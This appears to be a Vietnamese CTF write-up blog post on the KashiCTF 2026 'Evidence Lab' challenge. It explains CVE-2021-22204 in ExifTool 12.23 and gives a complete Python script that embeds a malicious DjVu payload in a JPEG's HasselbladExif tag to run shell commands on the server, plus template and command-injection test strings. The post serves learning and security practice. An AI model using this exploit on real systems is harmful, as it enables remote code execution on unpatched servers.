---
layout: single
title: "[KashiCTF 2026] Evidence Lab - ExifTool RCE qua CVE-2021-22204"
date: 2026-04-07
classes: wide
categories: [CTF, KashiCTF 2026, web]
tags: [web, forensics, kashictf, cve-2021-22204, exiftool, rce]
header:
  teaser: /assets/images/tournaments/kashictf.png
---

## Challenge Info

**Event:** KashiCTF 2026  
**Category:** Web / Forensics  
**CVE:** CVE-2021-22204  
**Difficulty:** Medium

---

## Nhìn vào challenge

Challenge này cho một web app đơn giản — upload ảnh lên, server sẽ dùng ExifTool để đọc metadata rồi trả kết quả. Hint của bài là *"Examine EXIF data, GPS coordinates, camera settings, and custom metadata fields carefully"*, nghe có vẻ bình thường nhưng cái quan trọng là: server đang chạy **ExifTool 12.23**.

Đây là phiên bản nằm trong phạm vi ảnh hưởng của **CVE-2021-22204** — lỗi cho phép RCE khi parse file DjVu có metadata độc.

---

## Phân tích kỹ thuật

### Tại sao ExifTool 12.23 bị RCE?

ExifTool được viết bằng Perl. Khi parse metadata từ chunk `ANTz` trong file DjVu, nó dùng hàm `eval()` nội bộ của Perl để xử lý. Vấn đề là input không được sanitize trước khi đưa vào `eval()`.

Để trigger, attacker chèn ký tự `\c` vào chuỗi metadata để phá ngữ cảnh string, sau đó nhét một block code Perl vào giữa `${...}`:

```text
(metadata "\c${system('cat /flag*')};")
```

Khi ExifTool gặp chuỗi này, nó eval nguyên xi — lệnh shell được thực thi thẳng.

### Vấn đề: server chỉ nhận file ảnh

Upload thẳng một file `.djvu` sẽ bị từ chối. Cần một cách khác.

ExifTool có một hành vi đặc biệt: nếu trong metadata EXIF của file JPEG có tag `0xc51b` (HasselbladExif), nó sẽ parse giá trị của tag đó như một DjVu document. Nghĩa là ta có thể giấu payload DjVu bên trong một file JPEG hoàn toàn hợp lệ.

---

## Thử nghiệm trước

Trước tiên mình thử upload ảnh có payload inject vào các trường EXIF thông thường:

```bash
exiftool -Artist='$(id)' -Comment='{% raw %}{{7*7}}{% endraw %}' -Copyright='`id`' test.jpg
```

Server trả về:
```text
ExifTool Version Number    : 12.23
Artist                     : $(id)
Comment                    : {% raw %}{{7*7}}{% endraw %}
Copyright                  : `id`
```

Tất cả đều hiển thị nguyên văn, không thực thi. Nhưng điều quan trọng là đã xác nhận được server đang dùng ExifTool 12.23 — phiên bản có lỗ hổng.

---

## Tạo payload và khai thác

Script bên dưới tự động tạo một file `image.jpg` đã được nhúng payload:

```python
#!/usr/bin/env python3
import base64, os, subprocess

# Lệnh cần chạy trên server
command = "system('cat /flag* /flag.txt /app/flag* 2>/dev/null')"

# Tạo file payload DjVu
payload = '(metadata "\\c${' + command + '};")'
with open('payload', 'w') as f:
    f.write(payload)

# Nén và đóng gói thành file DjVu hợp lệ
subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', 'INFO=1,1', 'BGjp=/dev/null', 'ANTz=payload.bzz'])

# Tạo file JPEG 1x1 pixel nhỏ nhất có thể
img_b64 = (b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEB"
           b"AgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/"
           b"yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k=")
with open('image.jpg', 'wb') as f:
    f.write(base64.decodebytes(img_b64))

# Config để ExifTool nhận tag HasselbladExif (0xc51b)
config = '''%Image::ExifTool::UserDefined = (
  'Image::ExifTool::Exif::Main' => {
    0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },
  },
); 1;'''
with open('exiftool.config', 'w') as f:
    f.write(config)

# Nhúng DjVu vào JPEG qua tag HasselbladExif
subprocess.run([
    'exiftool', '-config', 'exiftool.config',
    '-HasselbladExif<=exploit.djvu', 'image.jpg',
    '-overwrite_original_in_place', '-q'
])

for f in ['payload', 'payload.bzz', 'exploit.djvu', 'exiftool.config']:
    os.remove(f)

print('[+] Done. Upload file image.jpg lên challenge.')
```

Cài dependencies rồi chạy:
```bash
sudo apt install djvulibre-bin exiftool -y
python3 payload_gen.py
```

Upload `image.jpg` lên, server trả về:

```text
kashiCTF{lZoYHFhLIKYCVShw41BHSKZsiwZwFkImpKqWcRWAg65gjE2Qm9aomIkizleNFWdG}
ExifTool Version Number    : 12.23
File Type                  : JPEG
```

**Flag:** `kashiCTF{lZoYHFhLIKYCVShw41BHSKZsiwZwFkImpKqWcRWAg65gjE2Qm9aomIkizleNFWdG}`

---

## Tóm lại

- CVE-2021-22204 ảnh hưởng ExifTool từ 7.44 đến 12.23 — khá phổ biến trong các challenge Web/Forensics CTF
- Kỹ thuật nhúng DjVu vào JPEG qua tag `HasselbladExif` giúp bypass file type check phía server
- Luôn chú ý version của các tool backend trong response header — đây thường là điểm mở đầu của mọi exploit

## References
- [Exploit-DB #50911](https://www.exploit-db.com/exploits/50911)
- [UNICORDev/exploit-CVE-2021-22204](https://github.com/UNICORDev/exploit-CVE-2021-22204)
- [NVD CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)
